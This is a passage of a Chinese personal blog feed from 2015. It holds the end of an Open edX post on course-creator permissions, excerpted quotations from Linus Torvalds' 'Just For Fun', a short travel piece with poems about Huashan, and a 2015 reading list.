&lt;/pre&gt;

&lt;h2&gt;用户工作流&lt;/h2&gt;
&lt;p&gt;如果将ENABLE_CREATOR_GROUP设置为true，一个新的Studio用户的工作流是这样的:  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;用户创建新账号，他们在admin table中的状态是“未请求”.&lt;/li&gt;
&lt;li&gt;当用户进入到Studio面板中，他们将看到一条关于如何成为课程创建者的消息&lt;/li&gt;
&lt;li&gt;用户可以发送创建课程的请求，如此一来他们的状态变成"待决定"。&lt;/li&gt;
&lt;li&gt;如果他们的请求被通过，他们将收到一封通知邮件&lt;/li&gt;
&lt;li&gt;如果请求没通过，他们也将收到一封通知邮件&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;课程创建者管理&lt;/h2&gt;
&lt;p&gt;对应的管理地址是&lt;code&gt;/admin/course_creators/coursecreator/&lt;/code&gt;&lt;/p&gt;
&lt;h2&gt;设置联系邮箱&lt;/h2&gt;
&lt;p&gt;和方法一相同&lt;/p&gt;
&lt;h2&gt;处理既有的课程创建者&lt;/h2&gt;
&lt;p&gt;如果你希望给既有课程创建者授权，可通过这条指令&lt;code&gt;./manage.py cms populate_creators&lt;/code&gt;(嗯，你首先当然得在edx-platform目录下)&lt;/p&gt;
&lt;h2&gt;参考资料&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://github.com/edx/edx-platform/wiki/Controlling-course-creation-rights"&gt;Controlling-course-creation-rights&lt;/a&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 29 Apr 2015 00:00:00 +0000</pubDate><guid>tag:,2015-04-29:edx-ontrolling-course-creation-rights.html</guid><category>edx</category></item><item><title>Just For Fun</title><link>/just_for_fun.html</link><description>&lt;p&gt;-----摘自Linus Torvalds 《Just For Fun》&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我对生命的意义有种理论。我们可以在第一章里对人们解释生命的意义何在。这样 可以吸引住他们。一旦他们被吸引住,并且付钱买了书,剩下的章节里我们就可以胡扯了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;一切事物都将从生存走向娱乐.性，战争和linux&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;手机现在大体上还处于社会的层面,但也正在朝娱乐的阶段发展&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;但Linux也是娱乐,这种娱乐是金钱很难买到的。当你处在生存阶段时,金钱是一个非常强大的动机,因为用金钱换取生存是 件容易的事情。换取生存之类的东西是很容易的,但突然之间你进入了娱乐阶段,金钱就...&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我是个非常好养的孩子,以至她只要把我放在一个黑咕隆咚的储藏柜里,再配上一台电脑,偶尔朝里扔一些意大利面条,我就会感到格外高兴了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;个人计算机在变得像今天这样复杂之前,尤其是在像我这样呆头呆脑的青少年还可以打开电脑的盖子自己动手修理的时候 , 其实对孩子们很有好处。今天的电脑所面临的问题和汽车一样:它们变得越来越复杂,于是 人们很难将他们拆开再自己组装在一起,所以也就很难弄清那里面究竟是回事。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;数学和物理很有意思,所以也很好学。凡是需要死记硬背的课,我的热情都不高&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;自从发明了计算机之后,咖啡馆便是“呆子”们常去的场所。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我绝对是一个呆傻之徒，这一点毫无疑问。那个时候呆傻尚有性感的含义；不过我猜并不是真正的性感。你们所看到的是一个既呆傻又腼腆的学生，他是不是有点多余？于是我便坐在电脑旁，感到无限的快乐。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;然后就把书丢在地板上，再抄起一本物理课本，接着又从床上滚下来，坐在电脑前为一个新游戏编写程序。厨房就在卧室的外面，我常去那里弄点咖啡和松脆玉米饼&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我对名字、别人的面孔和我做过的事情都记不住。我们家的电话号码我都得问塔芙。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;一小堆简单基本的建筑材料，结合起来就能创造出无限的复杂表述。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;物理的规则亦是如此。你努力找出基本的规则，而这些规则都是相对简单的。从那些简单的规则中，通过相互作用产生令人不可思议的复杂性。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;简单需要特别的设计和很高的品味。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;最初有人想在等离子显示器上玩电脑游戏，那就是UNIX发展起来的原因。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;有关UNIX应共享的理念和当时的社会环境有关，而并不应简单地归功于其开放源代码的系统本身。那是一个有各种理想的时代。革命、解放、自由爱情&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;她们还谈起了李纳斯的记忆力非常之差，常常记不住别人的相貌。萨拉说：“要是你和他一起看电影，主人公本来穿一件红色衬衫，但后来换了件黄色的，他就会问：‘这人是谁？‘&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;当一个问题出现并始终困扰一个人时，你就会看到他的眼睛变得发直，他再也听不到你在说什么，也不回答你简单的问题，而是完全陷入眼前的问题之中，在解决方案的过程中废寝忘食，而且从不放弃。当然，他在日常生活中会被琐事打断，但事后还会继续单枪匹马地思索，这时你便知道他是什么样的人了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;你瞧，我脑子里从来没有新的思想，我想的事都是别人先想出来的，我再把它们重新组织起来。但萨拉想的事都是别人从没有想过的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;而是诚实的好奇心和征服所面临的困难的愿望，以及用最好的办法去克服困难。因为事情就是如此，他决不会后退。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他是非常好养的。他惟一需要的就是一个挑战，剩下来的事情就由他自己去解决了。就像我和萨拉过去常说的，只要给他一间斗室，里面放上一台电脑，再给他一些面条吃，他就会觉得无比幸福。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他打小起我就一直揪着心：照他这样怎么可能找到一个像样的女孩？我只得再次求助于父母们屡试不爽的办法--祈祷。你们瞧，还真灵验了！他是在大学教书时遇到塔芙的，她让他在几天之内忘记了他的猫和他的电脑，这毋庸讳言是上天的胜利，正如其一贯获胜那样。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我唯一的希望是名声不要让他分心太多。他的出名并没有改变他，但他变得温和多了，人们接近他时他也愿意和别人说话了。拒绝别人也让他感到比较为难了。但我想让他改变的与其说是所有媒体的喧嚣，还不如说主要是由于他成为了一个丈夫和一名父亲。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;对于任何编程的人来说，编程是世界上最有趣的事。它比下棋之类的游戏更有乐趣得多，因为它可以由你自己来制订游戏规则。而你制定什么样的规则，也就会导出与此规则相符合的结果。
然而，对于编程外行的人来说，它却似乎是世上最枯燥的事&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;计算机科学和物理科学有很多相似之处。两门学科都是在一个相当基础的层面上探讨一个体系是怎样运行的。当然，区别在于，在物理学中，你探究的是一个已经存在的客观世界的构成。而在计算机科学中，你却是在创造一个前所未有的体系。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;在电脑世界中，你就是创世者，你对所发生的一切拥有最终的控制。如果你功力深厚，你可以是上帝――在一个较小的层面上。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;你开始创造自己的世界，而唯一限制你的就是机器的性能，以及――在今天尤其如此――你自己的能力了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;在编程中，实用的考虑往往被置于有意思、美观伶俐或有震撼力的考虑之后。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;探究计算机工作原理的过程，是吸引我走进编程世界的最初原因。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;你必须从该体系自身的规则出发，推演出整个世界，在物理科学中，你被客观规律所束缚。但是在数学和编程中，只要能合乎逻辑地推演，就可以成立。思考数学问题，不会受到客观世界的逻辑的限制，数学只是逻辑自洽的符号体系&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;你必须多加小心，不要弄出什么与你创造的体系不一致的东西。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;人们对电脑如此着迷的原因之一，就是能从中获得自己创造一个新世界的体验，并贪图到它到底能够成为什么样子。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;在电脑的帮助下，人们可以形象化这些虚构的世界&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;盯着电脑屏幕，将一个问题彻头彻尾地贯穿思考，就需要某种特定的人。
比如，需要像我这种书呆子气十足的人。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;创造操作系统，就是去创造一个所有应用程序赖以运行的基础环境――从根本上来说，就是在制定规则：什么可以接受，什么可以做，什么不可以做。事实上，所有的程序都是在制定规则，只不过操作系统是在制定最根本的规则。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他们只不过找到了合理的考虑问题的方法&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;也可以通过找到正确的方法，使问题突然消失。你可以从不同的角度看问题。直到灵光突现地认识到：问题之所以成为问题只在于你的方法错了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;一个伟大的数学家不会采用平庸而繁琐的方法，因为他能看到隐藏在问题背后的真正内涵，并应用这一理解去找到更为简便的方法&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;人们需要看到事情的进展。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;一旦你已解决了最根本的问题，兴趣就容易很快地消失。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;与收到钱相比，我更喜欢收到明信片。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;要使Linux发展成最完美的技术就必须保持它的纯洁性。如果有铜臭渗透进来，事情就要变黑暗了。所以，如果不让钱的问题掺和进来，就不会有贪欲的参与。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;如果花一点钱买非法拷贝软件，而把五个月的工资用于吃饱肚子，我一点不觉得他不道德。这种侵权是道义上可以接受的。去追捕这种“侵权者”是不道德的，更不要说简直就是愚蠢的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这是我对微内核最重要的反驳：你想实现的简单化是错误的简单化。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这里的风光秀美得好像是把《国家地理杂志》上的照片原封不动搬下来似的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;喜欢去学生聚会的原因之一就是，这是一种无须过分社会化的社交活动。在这样的晚上我融入了社会，而在其他时间我与计算机在一起。在学生聚会里玩远比Linux更为感性，我从未为Linux感到心烦意乱，也从未因为Linux而睡不着觉。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;套接字(Socket)能让Linux有能力跳出本地网络，而可以异地连接计算机。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;困难的是用老练的技巧向一个人指出你更乐于采用另一个人的建议而不是他的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我很早就明白，最好的领导者不是让手下做他要求他们做的事情，而是让手下做他们自己想要做的事。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;同时，最好的领导者也明白，当手下犯错时，要让他们自己有能力纠正而不要总是自己出面纠正。最佳的领导者是能够让手下自作主张的人。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Linux所取得的许多成功，其实可以归结为我的缺点所致：
1、 我很懒散。
2、 我喜欢授权给其他人。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;黑客们的很大一部分动力，也来自于靠实实在在的贡献获得同行的认可和尊重的企图，开放源代码的发展项目给黑客们提供了这样的机会。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;她对我一生的影响甚至比《操作系统：设计与执行》一书对我的影响还要大.  在搬进去后的最初两周，我甚至都没有动过一下我的计算机。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我恐怕还从没见过一对像李纳斯和塔芙这样平等相待的两口子。我曾见过李纳斯做家务，见过他在塔芙早晨还赖在床上的时候给她弄上杯咖啡，即便是长途行车中应付两个小宝宝的闹上闹下的无理要求，这两口子也总是一副从容不迫的样子：这可真是一桩幸福婚姻。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;在那里，关于你对外能说些什么，公司只有一项规定，而这项规定就是：“什么都不能说。”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;无论是Transmeta的工作还是Linux的工作，都不是靠牺牲宝贵的睡眠时间换来的。事实上，如果你想听真话，那我就要说，我更喜欢睡觉。有些人可能会认为我懒，对这样的人我可真想把枕头朝他们掷过去。我对自己的行为有着近乎完美的借口：如果你把更多的时间花在睡觉上，那的确会损失一些工作时间，但如果你的睡眠很充足，在不睡觉的情况下，你的头脑就比别人都要清醒。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我总是将开放源代码视作一种使世界更趋美好的途径。但仅有这一点还远远不够，除此之外我还将它视作带来快乐的途径。这可就不怎么称得上是理想主义了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我什么都不知道，因为我在忙着追赶我的到处乱跑的女儿。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;作为计算机呆子的领头人所产生的压力，已经使我从一个电脑迷变成了一个混蛋。他错了，实际上我一直是一个混蛋&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这与我个人的开放与否无关，这只与他们拥有忽略我的权力有关。那才是最重要的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;不幸的是，人类的性情也是如此。人们希望有人告诉他们该如何行动。这种倾向植根在我们的基因核里。任何社会性的动物都本性如此。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;要变为一名领导者并不很难。那些没有这种信念的人，在某种程度上，更喜欢领导者替他们做出决策并告诉他们该怎么做。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我希望自己做出决定，我反对繁冗的社会规则。我坚持每个人如果在自己的天地里，只要不妨碍他人，就可以做自己想做的任何事情。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;如果我事先知道需要花费多少精力从事这项工作，而且十年以后我还在为这项工作努力，并且这将是十年中我的一份全职工作的话，则我决不会开始这项工作的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;人类的创造活动获得了一个价格标签，而且它居然是异常昂贵的。创造是稀有的，于是它不仅仅是昂贵的，也是相当奢侈的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;核武器是冷战时代的终极力量，同样的原因使得知识产权在技术战争时代里大受欢迎。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;成功在于质量，在于给大众提供他们想要的产品&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;如果有人试图以Linux为载体来捆绑销售它，那么，其他人就可以对它进行反捆绑，从而以人们真正想要的方式来出售它。试图以技术来控制人是决不可能成功的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;豪华游轮所出售的是对于自由的感知&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;你旁边是一个庞大的开发队伍，而不是一个以秘密小组形式组成的开发团队。潜在地拥有数百万更加聪明的头脑来参与同一项目，并且有同行评论过程的支持，&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;人们开始注意到一个显然的事实，那就是公开源代码是开发和提高最佳质量技术的最好方法。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;围绕着无数的增值服务已经创建了许多公司。当钱财滚滚而来时，人们开始相信公开源代码的魅力了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;在一个生存或多或少已经有保障的社会里，钱财并不是最大的激励因素。众所周知，当人们是由爱好和热情所驱使着的时候，往往能够将工作做得最好。对于剧作家、雕塑家和企业家是如此，对于软件工程师也是如此。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;公开源代码模式给人们提供了依靠兴趣与热情而生活的机会。享有乐趣以及与世界上最好的程序员一起工作，而不是与那些恰巧为他们的公司所雇佣的少数几个程序员一起工作，是一种无与伦比的享受&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;科学最初是被视为某种危险的、具有颠覆性质的以及是不允许从事的事情――基本上就是现在的软件公司有时候看待公开源代码的方式。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;公开源代码而突然能够与传统公司相竞争了。用伊萨克.牛顿爵士的话来说，那就是站在了巨人的肩膀上。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;公开源代码是利用外部资源的最佳方式&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Linux过去仅仅是为技术人员所使用的，对于思维怪异者可谓是安全的天堂。一个纯粹的堡垒，在那里技术很重要，而在别处却不然&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Linux所做的事情是让人们意识到了一种新的做事方法，意识到了公开源代码实际上是使得人们能够在别人的基础上从事自己的开发&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我更感兴趣的是社会是如何进化的，我们是如何从工业社会进入到信息社会的：下一上又是什么，&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;技术仅仅是限定了我们所能够做的事物的边界，以及能够以多大的成本来做。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;技术，就像它所创造的设备一样，至少迄今为止是天生愚蠢的。它之所以令人感兴趣的是仰仗着你所能够用它来实现的东西，它背后的驱动力实际上是人类的需求和兴趣。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;如今我们沟通和交流得到更多不是因为我们有了这样做的手段，而是因为人们从来就喜欢喋喋不休，他们想要交流，如果不存在通讯的手段，则人类就把它们创造出来。于是，便有了诺基亚。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;你就必须去理解是什么东西真正驱动着人们。是金钱？是性？是什么在根本上使人们正从事着他们的工作？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;问题不能是“你是否会为了钱财去杀人？”而是“你是否会为了钱财去死？”答案显然是不会。因此我们可以很有把握地将“金钱”从根本的激励因素列表中排除。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他们之所以死亡，并非由于他们想要诸如性这般愚蠢的事情，而是因为如果失去他们的特殊社会关系，他们宁愿死亡&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;性在很久以前就已经从一种纯粹生存现象进化到了一种相当社会化的现象了，不仅仅是在人类中间你会发现结婚仪式和许多为此目的准备的社会基础文化建构。事实上，人们每天都要消耗大量的能量，用于与物种再生产这一简单事情相关的求爱仪式上。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这是一个关于技术用来交流和传播信息――一种非常社会化的行为――而不仅仅是为了生存得更好的时代。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;经历了信息社会之后，就应该是娱乐社会了.那是一个思科（Cisco）成为往事，迪斯尼（Disney）拥有世界的时代。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Linux实际上既能给人带来通过智力挑战实际的乐趣，又能实现人们共同参与创造它时感受到的社会激励。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 28 Apr 2015 00:00:00 +0000</pubDate><guid>tag:,2015-04-28:just_for_fun.html</guid><category>读书</category></item><item><title>周末</title><link>/zhoumo0425.html</link><description>&lt;h3&gt;晚上于车中&lt;/h3&gt;
&lt;p&gt;&lt;img alt="zhoumo1" src="img/tuzhong/zhoumo1.JPG" /&gt;&lt;/p&gt;
&lt;p&gt;途中有趣之处也许在于， &lt;br /&gt;
你暂时被抛离出日常， &lt;br /&gt;
过去和未来一同被隔离， &lt;br /&gt;
你心安理得地荒废一段时光。 &lt;br /&gt;
它万劫不复地消逝，&lt;br /&gt;
而此时却结结实实被握在手里，&lt;br /&gt;
你随火车被抛到荒郊野外，&lt;br /&gt;
灯如鬼火，树如妖，&lt;br /&gt;
想一段惊悚或是浪漫的剧情，&lt;br /&gt;
而无论惊悚或是浪漫，&lt;br /&gt;
天都会亮。&lt;br /&gt;
美好在预知到速朽之后，反而变本加厉地美好了。&lt;/p&gt;
&lt;h3&gt;行程&lt;/h3&gt;
&lt;p&gt;渭河草地&lt;/p&gt;
&lt;p&gt;渭水之南草木青，&lt;br /&gt;
山坡柔软近呆萌。&lt;br /&gt;
帐中假寐闻妖气，&lt;br /&gt;
使我智商降到零。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;夜爬华山&lt;/p&gt;
&lt;p&gt;头顶繁星应不远，&lt;br /&gt;
城中灯火渐如萤。&lt;br /&gt;
身侧悬崖肯一跃，&lt;br /&gt;
可能相遇任盈盈。&lt;/p&gt;
&lt;p&gt;&lt;img alt="zhoumo2" src="img/tuzhong/zhoumo2.JPG" /&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 28 Apr 2015 00:00:00 +0000</pubDate><guid>tag:,2015-04-28:zhoumo0425.html</guid><category>途中</category></item><item><title>2015书单</title><link>/2015-books.html</link><description>&lt;h1&gt;读完&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;《通灵芯片》&lt;/li&gt;
&lt;li&gt;《大教堂与集市》&lt;/li&gt;
&lt;li&gt;《Just for Fun》&lt;/li&gt;
&lt;li&gt;《亲密关系》&lt;/li&gt;
&lt;li&gt;《小王子》&lt;/li&gt;
&lt;li&gt;《茶花女》&lt;/li&gt;
&lt;li&gt;《挪威的森林》&lt;/li&gt;
&lt;li&gt;《目送》&lt;/li&gt;
&lt;li&gt;《别闹了，费曼先生》&lt;/li&gt;
&lt;li&gt;《富爸爸穷爸爸》&lt;/li&gt;
&lt;li&gt;《红玫瑰与白玫瑰》&lt;/li&gt;
&lt;li&gt;《包法利夫人》&lt;/li&gt;
&lt;li&gt;《python3-cookbook》&lt;/li&gt;
&lt;li&gt;《Pro Git》&lt;/li&gt;
&lt;li&gt;《自私的皮球》&lt;/li&gt;
&lt;li&gt;《架构风格与基于网络的软件架构设计》&lt;/li&gt;
&lt;li&gt;《麦田守望者》&lt;/li&gt;
&lt;li&gt;《源泉》&lt;/li&gt;
&lt;li&gt;《乡村教师.刘慈欣》&lt;/li&gt;
&lt;li&gt;《白夜行》&lt;/li&gt;
&lt;li&gt;《黄金时代.王小波》&lt;/li&gt;
&lt;li&gt;《撒哈拉的故事》&lt;/li&gt;
&lt;li&gt;《哲学问题》&lt;/li&gt;
&lt;li&gt;《西方哲学史》&lt;/li&gt;
&lt;li&gt;《Python高手之路》&lt;/li&gt;
&lt;li&gt;《RESTful Web Services Cookbook》(中文版)&lt;/li&gt;
&lt;li&gt;《失控》&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;&lt;/h1&gt;
&lt;p&gt;在读
&lt;em&gt;  《故事》
&lt;/em&gt;  《当代分析哲学》
&lt;em&gt;  《unix编程艺术》
&lt;/em&gt;  《精通正则表达式》
&lt;em&gt;  《鹿鼎记》
&lt;/em&gt;  《敏捷软件开发：原则、模式与实践》
*  《JavaScript DOM编程艺术》&lt;/p&gt;
&lt;h1&gt;&lt;/h1&gt;
&lt;p&gt;中途搁置
